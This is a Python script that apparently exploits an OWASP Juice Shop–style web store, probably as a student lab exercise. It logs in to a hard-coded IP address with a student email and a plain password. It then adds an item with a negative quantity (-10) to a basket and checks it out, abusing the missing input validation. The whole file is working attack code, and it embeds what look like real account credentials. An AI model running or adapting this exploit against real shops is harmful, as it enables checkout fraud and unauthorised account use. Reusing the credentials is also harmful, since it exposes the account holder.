import json

import requests

# Update basket number! Find by adding anything to cart with Chrome's network tab in devtools open
basket_id = 9

s = requests.Session()

r = s.post(
    'http://43.241.202.47:3003/rest/user/login',
    data=json.dumps({
        "email": 'a1644290@student.adelaide.edu.au',
        "password": 'qwerty',
    }),
    headers={'Content-type': 'application/json;charset=utf-8'},
)

print("Login:", r)

s.headers.update({'Authorization': "Bearer " + json.loads(r.text)['authentication']['token']})
r = s.post(
    'http://43.241.202.47:3003/api/BasketItems/',
    data=json.dumps({'ProductId': 2, 'BasketId': str(basket_id), 'quantity': -10}),
    headers={'Content-type': 'application/json', },
)
print("Add to basket:", r)

r = s.post('http://43.241.202.47:3003/rest/basket/' + str(basket_id) + '/checkout')

print("Checkout basket:", r)
